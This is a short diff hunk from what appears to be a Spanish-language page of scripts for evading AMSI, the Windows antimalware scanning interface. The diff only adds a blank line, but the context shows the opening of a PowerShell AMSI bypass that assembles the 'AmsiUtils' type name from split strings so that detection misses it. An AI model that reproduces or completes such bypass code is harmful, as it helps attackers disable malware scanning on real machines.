@@ -37,6 +37,7 @@ Estos scripts podrían ser detectados por AMSI en el futuro. Por lo que recomien
 
 <details><summary>Ver Script</summary>
 <p>
+ 
 ```powershell
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' 
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
